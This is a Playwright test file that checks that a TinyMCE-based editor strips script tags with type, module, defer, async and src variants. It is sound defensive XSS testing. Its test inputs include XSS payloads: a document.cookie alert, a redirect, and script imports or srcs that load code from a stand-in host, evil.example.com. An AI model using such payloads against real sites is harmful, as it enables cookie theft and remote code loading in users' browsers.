import {test, expect} from '../../fixtures/test'

// Script tags with various type attributes are XSS vectors.
// The basic <script> case is covered, but type-specific variants
// (text/javascript, application/javascript, module, text/vbscript)
// must all be stripped — TinyMCE's script filter must not be tricked
// by type= values into allowing executable script content through.
test.describe('script tag type attribute variants', () => {
  test.beforeEach(async ({page, rcePage}) => {
    await page.goto('/scenarios/basic')
    await rcePage.waitForEditor()
  })

  async function setAndGet(page: any, html: string): Promise<string> {
    return page.evaluate((content: string) => {
      // @ts-expect-error -- TinyMCE global
      window.tinymce.activeEditor.setContent(content)
      // @ts-expect-error -- TinyMCE global
      return window.tinymce.activeEditor.getContent()
    }, html)
  }

  test('<script type="text/javascript"> is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<script type="text/javascript">alert(document.cookie)</script><p>safe</p>',
    )
    expect(content).not.toContain('alert(document.cookie)')
    expect(content).toContain('safe')
  })

  test('<script type="application/javascript"> is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<script type="application/javascript">document.location="https://evil.example.com"</script><p>text</p>',
    )
    expect(content).not.toContain('document.location')
    expect(content).toContain('text')
  })

  test('<script type="module"> is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<script type="module">import("https://evil.example.com/payload.js")</script><p>content</p>',
    )
    expect(content).not.toContain('import(')
    expect(content).toContain('content')
  })

  test('<script defer> is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<script defer src="https://evil.example.com/deferred.js"></script><p>main</p>',
    )
    expect(content).not.toContain('<script')
    expect(content).toContain('main')
  })

  test('<script async> is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<script async src="https://evil.example.com/async.js"></script><p>page</p>',
    )
    expect(content).not.toContain('<script')
    expect(content).toContain('page')
  })

  test('<script src="..."> external script is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<script src="https://evil.example.com/tracker.js"></script><p>body</p>',
    )
    expect(content).not.toContain('tracker.js')
    expect(content).toContain('body')
  })

  test('<script type="text/template"> non-executable script is handled', async ({page}) => {
    // text/template is used by some frameworks for client templates — not executable
    const content = await setAndGet(
      page,
      '<script type="text/template"><p>Template content</p></script><p>after</p>',
    )
    // TinyMCE may strip it or preserve it inert — document actual behavior
    expect(content).not.toContain('alert')
    expect(content).toContain('after')
  })
})
